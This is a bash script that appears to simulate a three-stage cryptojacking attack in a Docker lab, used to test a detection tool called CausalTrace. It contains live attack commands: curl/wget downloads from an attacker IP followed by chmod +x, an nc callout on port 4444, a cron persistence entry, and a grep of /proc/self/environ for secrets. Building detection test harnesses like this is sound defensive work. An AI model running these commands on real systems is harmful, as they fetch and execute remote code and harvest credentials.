#!/bin/bash
# cryptominer_attack.sh — Cryptominer deployment via compromised service
#
# Attack scenario: An attacker compromises the inventory-service (e.g., via
# dependency confusion or deserialization vuln) and uses it to:
#   1. Download a cryptominer binary from external infrastructure
#   2. Execute the binary (unusual execve pattern)
#   3. Connect to a mining pool (novel outbound connection)
#
# CausalTrace detects this via:
#   - Behavior bit: BIT_SHELL_SPAWN (unexpected binary execution)
#   - Novel-edge: inventory-service → attacker:8888 (download)
#   - Novel-edge: inventory-service → external mining pool
#   - Sheaf anomaly: bigram pattern shifts dramatically (mining syscall profile
#     is very different from normal service operation)
#
# Why Falco/Tetragon miss this:
#   - execve is a normal syscall (containers run binaries all the time)
#   - connect() to external IP is normal (services call APIs)
#   - No privilege escalation needed
#   - Only the PATTERN of syscalls (compute-heavy, unusual exec) is anomalous

LOG_DIR="${1:-results/run_latest/production_detection}"
mkdir -p "$LOG_DIR"

echo "============================================================"
echo "  Cryptominer Attack — 3 Stages"
echo "  $(date)"
echo "============================================================"

# ── STAGE 1: Download malicious binary ──────────────────────────
echo ""
echo "[STAGE 1] $(date +%s%N) — Download: inventory-service → attacker HTTP"
echo "  Compromised dependency downloads a binary from attacker infrastructure"

STAGE1_START=$(date +%s%N)
docker exec ct-prod-inventory bash -c '
    # Download "miner" from attacker HTTP server (port 8888)
    curl -s -o /tmp/miner http://172.22.0.25:8888/Exploit.class 2>/dev/null || \
    wget -q -O /tmp/miner http://172.22.0.25:8888/Exploit.class 2>/dev/null || true
    # Make it executable
    chmod +x /tmp/miner 2>/dev/null || true
    ls -la /tmp/miner 2>/dev/null
' > "$LOG_DIR/miner_stage1.log" 2>&1
STAGE1_END=$(date +%s%N)

echo "  Latency: $(( (STAGE1_END - STAGE1_START) / 1000000 )) ms"
echo "  Expected: Novel-edge (inventory → attacker:8888 not calibrated)"

sleep 3

# ── STAGE 2: Execute suspicious binary ──────────────────────────
echo ""
echo "[STAGE 2] $(date +%s%N) — Execute: run downloaded binary"
echo "  Miner binary starts, generating unusual execve + compute patterns"

STAGE2_START=$(date +%s%N)
docker exec ct-prod-inventory bash -c '
    # Simulate miner execution (compute-heavy loop)
    # In real attack: ./tmp/miner --pool stratum+tcp://pool.example.com:3333
    # We simulate with a CPU-burning loop + network probe
    timeout 3 bash -c "while true; do echo -n >/dev/null; done" &
    MINER_PID=$!
    # Miner would connect to pool — simulate with attacker connection
    nc -w2 172.22.0.25 4444 2>/dev/null < /dev/null || true
    kill $MINER_PID 2>/dev/null
' > "$LOG_DIR/miner_stage2.log" 2>&1
STAGE2_END=$(date +%s%N)

echo "  Latency: $(( (STAGE2_END - STAGE2_START) / 1000000 )) ms"
echo "  Expected: BIT_SHELL_SPAWN + Novel-edge (inventory → attacker:4444)"

sleep 3

# ── STAGE 3: Persistence via crontab ────────────────────────────
echo ""
echo "[STAGE 3] $(date +%s%N) — Persist: install crontab for restart"
echo "  Miner installs persistence mechanism"

STAGE3_START=$(date +%s%N)
docker exec ct-prod-inventory bash -c '
    # Try to write persistence (crontab or init script)
    echo "* * * * * /tmp/miner" > /tmp/miner_cron 2>/dev/null || true
    # Read sensitive system files for additional recon
    cat /proc/self/environ 2>/dev/null | tr "\0" "\n" | grep -i "key\|secret\|pass" || true
    cat /proc/cpuinfo 2>/dev/null | head -5 || true
' > "$LOG_DIR/miner_stage3.log" 2>&1
STAGE3_END=$(date +%s%N)

echo "  Latency: $(( (STAGE3_END - STAGE3_START) / 1000000 )) ms"
echo "  Expected: BIT_SENSITIVE_FILE (/proc/self/environ)"

echo ""
echo "============================================================"
echo "  CRYPTOMINER ATTACK COMPLETE — $(date)"
echo "============================================================"
echo ""
echo "Summary:"
echo "  Stages: 3 (download, execute, persist)"
echo "  Attack class: Resource hijacking / Cryptojacking"
echo "  MITRE ATT&CK: T1496 (Resource Hijacking), T1059 (Command Execution)"
echo "  Novel edges: inventory→attacker:8888, inventory→attacker:4444"
echo "  Behavior bits: BIT_SHELL_SPAWN, BIT_SENSITIVE_FILE"
echo "  Sheaf anomaly: compute-heavy bigram pattern shift"
echo ""
echo "Why traditional tools miss this:"
echo "  - execve of downloaded binary is just a normal fork+exec"
echo "  - Outbound connections are normal connect() syscalls"
echo "  - No privilege escalation, no container escape"
echo "  - Detection requires correlating exec + network + behavior pattern"
